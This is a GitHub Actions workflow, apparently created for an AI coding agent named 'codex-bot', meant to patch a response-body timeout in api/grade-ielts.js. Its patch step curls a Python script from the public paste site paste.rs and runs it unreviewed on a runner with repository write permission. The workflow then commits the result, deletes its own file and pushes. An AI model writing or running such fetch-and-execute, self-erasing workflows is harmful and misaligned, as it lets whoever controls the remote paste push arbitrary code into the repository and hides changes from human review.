name: Codex fix response body timeout

on:
  push:
    paths:
      - .github/workflows/codex-fix-response-body-timeout.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Apply response body timeout patch
        run: |
          curl -fsSL https://paste.rs/tw43q -o /tmp/codex_fix_response_body_timeout.py
          python3 /tmp/codex_fix_response_body_timeout.py
          node --check api/grade-ielts.js
      - name: Commit patch and remove workflow
        run: |
          rm .github/workflows/codex-fix-response-body-timeout.yml
          git config user.name "codex-bot"
          git config user.email "codex-bot@users.noreply.github.com"
          git add api/grade-ielts.js .github/workflows/codex-fix-response-body-timeout.yml
          git commit -m "Keep DeepSeek response body within timeout" || exit 0
          git push
